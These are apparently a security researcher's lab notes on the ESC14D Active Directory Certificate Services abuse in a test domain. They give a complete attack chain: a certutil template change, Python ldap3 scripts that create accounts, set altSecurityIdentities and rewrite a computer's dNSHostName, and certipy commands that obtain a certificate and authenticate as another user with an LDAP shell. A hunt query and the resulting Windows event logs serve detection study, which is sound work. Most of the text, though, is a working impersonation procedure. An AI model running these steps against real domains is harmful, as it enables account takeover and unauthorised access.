# ESC14D (X509SubjectOnly)

# Sources:

[https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82)

# Hunts



## Winlogbeat

### Change dNSHostName attribute

```jsx
winlog.event_id:(5136)
AND winlog.event_data.AttributeLDAPDisplayName:(dNSHostName)
AND -winlog.event_data.SubjectUserName:(*your_admins*)
```

# Commands

## Short version

```jsx
#Preparation:
#TemplateESC14C_req_cn. Require common name in template. Allow enrol for Domain Computers in template

Setup CT_FLAG_NO_SECURITY_EXTENSION on template
certutil -dstemplate ESC14C_req_cn msPKI-Enrollment-Flag +0x80000

#Script creates computer account ESC14D$. Script creates user account esc14d_user and write altSecurityIdentities:
python esc14d_prep_target_user.py

#Attack: 
#For computer account ESC14D$ change dNSHostName attribute to ESC14D_user
python esc14d_rename_dNSHostName.py

#Request certificate as ESC14D$
certipy  req -username "ESC14D$" -password "Passw0rd\!" -dc-ip '192.168.56.12' -web  -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC14C_req_cn' -debug

#Authentication as esc14d_user' 
certipy auth -pfx 'esc14d.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -username 'esc14d_user' -ldap-shell -debug

#Cleanup (delete computer account ECS14D$ and user accountу esc14d_user
python esc14d_cleanup.py  
 
```

## Preparation

TemplateESC14C_req_cn. Require common name in template. Allow enrol for Domain Computers in template

Setup CT_FLAG_NO_SECURITY_EXTENSION on template

```jsx
certutil -dstemplate ESC14C_req_cn msPKI-Enrollment-Flag +0x80000
```

Script creates computer account ESC14D$. Script creates user account esc14d_user and write altSecurityIdentities:

```jsx
import ldap3
from ldap3 import MODIFY_REPLACE, NTLM, ALL

## Create user
# --- Configuration ---
server = ldap3.Server("192.168.56.12", use_ssl=True, port=636, get_info=ALL)  # LDAPS
domain = "essos.local"
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# DN of the container where the user will be created
ou_dn = "CN=Users,DC=essos,DC=local"

# New user
user_name = "ESC14D_user"
user_dn = f"CN={user_name},{ou_dn}"
user_principal = f"{user_name}@{domain}"

# Password (must be in quotes and UTF-16LE encoded)
new_password = '"Passw0rd!"'.encode("utf-16-le")

# Value for altSecurityIdentities
alt_sec_id = f"X509:<S>CN={user_name}"

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM,
    auto_bind=True
)

print("[+] Connection successful")

# --- Create user ---
success = conn.add(
    dn=user_dn,
    object_class=["top", "person", "organizationalPerson", "user"],
    attributes={
        "cn": user_name,
        "sAMAccountName": user_name,
        "userPrincipalName": user_principal,
        "displayName": user_name,
        "unicodePwd": new_password,
        "userAccountControl": 0x200  # NORMAL_ACCOUNT
    }
)

if success:
    print(f"[+] User {user_name} created with password Passw0rd!")
else:
    print("[-] User creation error:", conn.result)
    conn.unbind()
    exit()

# --- Set altSecurityIdentities ---
success = conn.modify(
    dn=user_dn,
    changes={
        "altSecurityIdentities": [(MODIFY_REPLACE, [alt_sec_id])]
    }
)

if success:
    print(f"[+] altSecurityIdentities attribute set: {alt_sec_id}")
else:
    print("[-] Attribute modification error:", conn.result)

conn.unbind()

# Create computer
# --- Configuration ---
server = ldap3.Server('192.168.56.12', get_info=ALL, use_ssl=True)  # LDAPS required
domain = "essos.local"
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# DN of the container where the computer will be created
ou_dn = "CN=Computers,DC=essos,DC=local"

# Name of the new computer
computer_name = "ESC14D"
computer_fqdn = f"{computer_name.lower()}.{domain}"

# Full DN of the new computer account
computer_dn = f"CN={computer_name},{ou_dn}"

# Password (must be in UTF-16LE and in quotes)
new_password = '"Passw0rd!"'.encode('utf-16-le')

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM,
    auto_bind=True
)
 
print("[+] Connection successful")

# --- Create computer account ---
success = conn.add(
    dn=computer_dn,
    object_class=['top', 'person', 'organizationalPerson', 'user', 'computer'],
    attributes={
        'cn': computer_name,
        'sAMAccountName': computer_name + "$",
        'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
        'dNSHostName': computer_fqdn,
        'unicodePwd': new_password
    }
)
 
if success:
    print(f"[+] Computer {computer_name} was created with password Passw0rd!")
else:
    print("[-] Error:", conn.result)
    conn.unbind()
    exit()

```

```jsx
python esc14d_prep_target_user.py
```

## Change dNSHostName for ESC14D$ to “ESC14D_user”

```jsx
import ldap3
from ldap3 import MODIFY_REPLACE, NTLM

# --- Configuration ---
server = ldap3.Server("192.168.56.12")
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# DN of the computer account ESC14D (adjust the path if not in "Computers")
computer_dn = "CN=ESC14D,CN=Computers,DC=essos,DC=local"

# New attribute value
new_dns_host_name = "ESC14D_user"

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM
)

if not conn.bind():
    print("[-] Connection error:", conn.result)
    exit()

print("[+] Connection successful")

# --- Modify dNSHostName attribute ---
success = conn.modify(
    dn=computer_dn,
    changes={
        "dNSHostName": [(MODIFY_REPLACE, [new_dns_host_name])]
    }
)

if success:
    print(f"[+] dNSHostName attribute successfully changed to {new_dns_host_name}")
else:
    print("[-] Attribute modification error:", conn.result)

conn.unbind()

```

```jsx
python esc14d_rename_dNSHostName.py
```

## Request certificate as computer account ESC14D$

```jsx
certipy  req -username "ESC14D$" -password "Passw0rd\!" -dc-ip '192.168.56.12' -web  -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC14C_req_cn' -debug
```

## Authenication as user “esc14d_user”

```jsx
certipy auth -pfx 'esc14d.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -username 'esc14d_user' -ldap-shell -debug
```

## Cleanup

 (remove computer account ECS14C$ and ESC14D_user)

```jsx
import ldap3
from ldap3 import NTLM

server = ldap3.Server('192.168.56.12')
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# DN of the computer account to be deleted (ESC14D)
computer_dn = "CN=ESC14D,CN=Computers,DC=essos,DC=local"

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM
)

if not conn.bind():
    print("[-] Connection error:", conn.result)
    exit()

print("[+] Connection successful")

# --- Delete computer account ---
success = conn.delete(computer_dn)

if success:
    print(f"[+] Account {computer_dn} successfully deleted")
else:
    print("[-] Deletion error:", conn.result)

conn.unbind()

# DN of the user account to be deleted (ESC14D_user)
user_dn = "CN=ESC14D_user,CN=Users,DC=essos,DC=local"

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM
)

if not conn.bind():
    print("[-] Connection error:", conn.result)
    exit()

print("[+] Connection successful")

# --- Delete user account ---
success = conn.delete(user_dn)

if success:
    print(f"[+] Account {user_dn} successfully deleted")
else:
    print("[-] Deletion error:", conn.result)

conn.unbind()

```

```jsx
python esc14d_cleanup.py
```

# Артефакты

## 4624. An account was successfully logged on. Schannel

```jsx
An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\ESC14D_user
	Account Name:		ESC14D_user
	Account Domain:		ESSOS
	Logon ID:		0x4C7F3A
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{16086328-3143-edba-4caa-4c3cf93d9da1}

Process Information:
	Process ID:		0x2ac
	Process Name:		C:\Windows\System32\lsass.exe

Network Information:
	Workstation Name:	MEEREEN
	Source Network Address:	192.168.56.200
	Source Port:		37311

Detailed Authentication Information:
	Logon Process:		Schannel
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T23:05:54.431506800Z" /> 
  <EventRecordID>118858</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="684" ThreadID="2812" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-18</Data> 
  <Data Name="SubjectUserName">MEEREEN$</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x3e7</Data> 
  <Data Name="TargetUserSid">S-1-5-21-1330862731-2240521544-517571234-1641</Data> 
  <Data Name="TargetUserName">ESC14D_user</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0x4c7f3a</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">Schannel</Data> 
  <Data Name="AuthenticationPackageName">Kerberos</Data> 
  <Data Name="WorkstationName">MEEREEN</Data> 
  <Data Name="LogonGuid">{16086328-3143-EDBA-4CAA-4C3CF93D9DA1}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">-</Data> 
  <Data Name="KeyLength">0</Data> 
  <Data Name="ProcessId">0x2ac</Data> 
  <Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data> 
  <Data Name="IpAddress">192.168.56.200</Data> 
  <Data Name="IpPort">37311</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

## 39. The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way

```jsx
The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way (such as via explicit mapping, key trust mapping, or a SID). Such certificates should either be replaced or mapped directly to the user via explicit mapping. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

  User: ESC14D_user
  Certificate Subject: @@@CN=ESC14D_user
  Certificate Issuer: ESSOS-CA
  Certificate Serial Number: 6400000061B701FD517D9BBAA7000000000061
  Certificate Thumbprint: E454686DB0310D52EF9B5CC674B85328781E8FCA
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">39</EventID> 
  <Version>0</Version> 
  <Level>3</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T23:05:54.417397900Z" /> 
  <EventRecordID>8697</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">ESC14D_user</Data> 
  <Data Name="Subject">@@@CN=ESC14D_user</Data> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">6400000061B701FD517D9BBAA7000000000061</Data> 
  <Data Name="Thumbprint">E454686DB0310D52EF9B5CC674B85328781E8FCA</Data> 
  <Binary /> 
  </EventData>
  </Event>
```

## 5136. A directory service object was modified.. Change dNSHostName for computer account

```jsx
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\Administrator
	Account Name:		Administrator
	Account Domain:		ESSOS
	Logon ID:		0x4E72FE

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=ESC14D,CN=Computers,DC=essos,DC=local
	GUID:	CN=ESC14D,CN=Computers,DC=essos,DC=local
	Class:	computer
	
Attribute:
	LDAP Display Name:	dNSHostName
	Syntax (OID):	2.5.5.12
	Value:	ESC14D_user
	
Operation:
	Type:	Value Added
	Correlation ID:	{da5c9b88-a96a-45d3-aca3-cd8ce7cdecf7}
	Application Correlation ID:	-

```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T23:11:44.243399700Z" /> 
  <EventRecordID>119079</EventRecordID> 
  <Correlation ActivityID="{C344C1A4-0F99-0000-C2C2-44C3990FDC01}" /> 
  <Execution ProcessID="684" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{DA5C9B88-A96A-45D3-ACA3-CD8CE7CDECF7}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-1330862731-2240521544-517571234-500</Data> 
  <Data Name="SubjectUserName">Administrator</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x4e72fe</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=ESC14D,CN=Computers,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{B15E5E3D-A10A-4DC1-BF45-4BA08390D819}</Data> 
  <Data Name="ObjectClass">computer</Data> 
  <Data Name="AttributeLDAPDisplayName">dNSHostName</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.12</Data> 
  <Data Name="AttributeValue">ESC14D_user</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

## 4887. Certificate Services approved a certificate request and issued a certificate.

```jsx
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	98
Requester:	ESSOS\ESC14D$
Attributes:	
Disposition:	3
SKI:		d1 52 68 62 bf 9a 62 5d 4b 46 f8 aa 8d 3c 7c bf 5b 08 90 5b
Subject:	CN=ESC14D_user
Subject Alternative Name:

Certificate Template:	ESC14C_req_cn
Serial Number:		6400000062aaafe1c9f12f0f96000000000062
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM

```

## 4886. Certificate Services received a certificate request.

```jsx
Certificate Services received a certificate request.
	
Request ID:	98
Requester:	ESSOS\ESC14D$
Attributes:	
CertificateTemplate:ESC14C_req_cn
ccm:braavos.essos.local
Subject from CSR:	CN=Esc14d$
Subject Alternative Name from CSR:

Requested Template:	ESC14C_req_cn
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T23:11:43.4702536Z" /> 
  <EventRecordID>60729</EventRecordID> 
  <Correlation ActivityID="{4beb5801-0f9c-0001-f259-eb4b9c0fdc01}" /> 
  <Execution ProcessID="752" ThreadID="800" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">98</Data> 
  <Data Name="Requester">ESSOS\ESC14D$</Data> 
  <Data Name="Attributes">CertificateTemplate:ESC14C_req_cn ccm:braavos.essos.local</Data> 
  <Data Name="Subject">CN=Esc14d$</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">ESC14C_req_cn</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">DCOM</Data> 
  </EventData>
  </Event>
```

